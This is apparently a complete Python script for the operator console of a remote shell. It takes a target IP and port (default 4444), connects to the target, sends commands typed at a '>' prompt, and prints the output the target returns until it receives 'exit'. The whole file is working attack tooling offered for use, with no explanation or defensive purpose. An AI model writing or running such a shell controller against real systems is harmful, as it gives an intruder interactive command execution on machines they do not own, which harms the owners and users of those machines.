import socket
import click
import subprocess


@click.command()
@click.option("--target", "-t", help="set the target ip address.", prompt="Target_ip")
@click.option(
    "--port",
    "-p",
    default=4444,
    help="set the target port (default value is 4444).",
    prompt="Port",
)
def main(target, port):
    target_host = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    target_host.connect((target, port))
    while True:
        command = (input("> ") + "\n").encode()
        if command.decode()[:-1].strip() == "clear":
            subprocess.run("clear")
            continue

        target_host.send(command)
        chunks = []
        while True:
            chunk = target_host.recv(1024)
            chunks.append(chunk)
            if chunk and chunk.decode()[-1] == "\n":
                break
            if not chunk:
                break
            
        response = b"".join(chunks).decode()
        print(response)
        if response.strip() == "exit":
            target_host.close()
            break


main()
